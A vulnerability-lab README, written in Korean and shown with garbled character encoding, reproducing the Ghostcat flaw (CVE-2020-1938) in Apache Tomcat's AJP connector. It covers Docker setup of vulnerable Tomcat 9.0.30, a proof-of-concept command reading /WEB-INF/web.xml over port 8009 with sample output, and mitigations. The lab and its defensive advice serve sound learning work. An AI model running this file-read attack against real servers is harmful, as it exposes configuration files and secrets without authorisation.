# CVE-2020-1938 - Ghostcat (Apache Tomcat AJP File Read Vulnerability)

## ê°œìš”

**CVE-2020-1938**, ì¼ëª… **Ghostcat**ì€ Apache Tomcatì˜ AJP ì»¤ë„¥í„°(AJP/1.3 í”„ë¡œí† ì½œ)ë¥¼ ì•…ìš©í•´ ì¸ì¦ ì—†ì´ Tomcat ë‚´ë¶€ì˜ ë¯¼ê° íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.  
AJP í¬íŠ¸ê°€ ì™¸ë¶€ì— ë…¸ì¶œë˜ì–´ ìˆëŠ” ê²½ìš°, ê³µê²©ìëŠ” `/WEB-INF/web.xml` ë“± ì„œë²„ ë‚´ë¶€ íŒŒì¼ì„ ì‚¬ìš©ì ì…ë ¥ê°’ ê²€ì¦ì—†ì´ ì—´ëŒ ë° ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

- **ì·¨ì•½ì  ID:** CVE-2020-1938  
- **ê³µê°œì¼:** 2020-02-20 
- **ì·¨ì•½ì  ìœ í˜•:** ì •ë³´ ìœ ì¶œ (Information Disclosure)  
- **PoC ê°€ëŠ¥ ì—¬ë¶€:** ê°€ëŠ¥ (Docker í™˜ê²½ êµ¬ì„± ì™„ë£Œ)

---

## í™˜ê²½ êµ¬ì„± ë°©ë²•

### 1. ì‹¤í–‰ í™˜ê²½ (Docker)

```bash
git clone https://github.com/kimyeeun21/kr-vulhub.git
cd kr-vulhub/CVE-2020-1938
docker compose up -d  ëª…ë ¹ì–´ë¡œ Apache Tomcat ì‹¤í–‰
```

- ë¸Œë¼ìš°ì €ì—ì„œ `http://localhost:8080` ì ‘ì† â†’ Tomcat ì •ìƒ êµ¬ë™ í™•ì¸
- ì»¨í…Œì´ë„ˆëŠ” í¬íŠ¸ 8080(HTTP), 8009(AJP)ì„ ì—°ë‹¤

---

## PoC ì‹¤í–‰ ë°©ë²•

### 1. ì‚¬ì „ ì¤€ë¹„

- Python 3.12.9 ì„¤ì¹˜

### 2. ê³µê²© ëª…ë ¹ì–´

```bash
python poc.py 127.0.0.1 -p 8009 -f /WEB-INF/web.xml
```

### 3. PoC ì„±ê³µ ê²°ê³¼

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         version="4.0" metadata-complete="true">
  <display-name>Welcome to Tomcat</display-name>
  <description>Welcome to Tomcat</description>
</web-app>
```

> Tomcatì˜ ë‚´ë¶€ ì„¤ì • íŒŒì¼(web.xml)ì„ ì„±ê³µì ìœ¼ë¡œ ì—´ëŒí•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

---

## PoC í™˜ê²½ êµ¬ì„± íŒŒì¼

### docker-compose.yml

```yaml
version: '2'
services:
  tomcat:
    image: tomcat:9.0.30
    ports:
      - "8080:8080"
      - "8009:8009"
```

### Dockerfile

```dockerfile
FROM tomcat:9.0.30
```

### poc.py

- Vulhubì˜ [PoC ì½”ë“œ](https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2020-1938/poc.py)ë¥¼ ì‚¬ìš©
- Python 3.11 ì´ìƒ í˜¸í™˜ì„ ìœ„í•´ `bufsize` ì œê±°, `bytes.decode()`ë¡œ ì¶œë ¥ ì²˜ë¦¬

---

## ëŒ€ì‘ ë°©ì•ˆ

| ì¡°ì¹˜              | ì„¤ëª…                                                    |
|-------------------|---------------------------------------------------------|
| AJP ë¹„í™œì„±í™”   | `server.xml`ì—ì„œ AJP ì»¤ë„¥í„° ì œê±° ë˜ëŠ” ì£¼ì„ ì²˜ë¦¬        |
| ë°©í™”ë²½ ì„¤ì •    | 8009 í¬íŠ¸ë¥¼ ì™¸ë¶€ì—ì„œ ì ‘ê·¼í•˜ì§€ ëª»í•˜ë„ë¡ ë°©í™”ë²½ ì°¨ë‹¨     |
| â¬†ë²„ì „ ì—…ê·¸ë ˆì´ë“œ | Apache Tomcatì„ 9.0.31 ì´ìƒìœ¼ë¡œ ì—…ê·¸ë ˆì´ë“œ              |

### `server.xml` ì˜ˆì‹œ (AJP ì£¼ì„ ì²˜ë¦¬)

Tomcat ì„¤ì • íŒŒì¼ì¸ `server.xml`ì—ì„œ AJP í¬íŠ¸ë¥¼ ì£¼ì„ ì²˜ë¦¬í•˜ë©´ ì™¸ë¶€ì—ì„œ í•´ë‹¹ í¬íŠ¸ ì ‘ê·¼ì´ ì°¨ë‹¨ë©ë‹ˆë‹¤.

```xml
<!--
<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
-->
---

## ğŸ“ ì°¸ê³  ìë£Œ

- [CVE-2020-1938 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)
- [Tenable - Ghostcat ìƒì„¸ ë¶„ì„](https://www.tenable.com/blog/ghostcat-vulnerability-discovered-in-apache-tomcat-cve-2020-1938)
- [Vulhub - CVE í™˜ê²½](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938)



## âœ… PoC ê²°ê³¼ ìº¡ì²˜

![PoC ì‹¤í–‰ ê²°ê³¼](./xml_result.png")

---

## ğŸ”— ì œì¶œ ì •ë³´

- **GitHub Repo:** https://github.com/kimyeeun21/kr-vulhub 
- **Pull Request:** [PR ìƒì„± í›„ ë§í¬ ì…ë ¥]

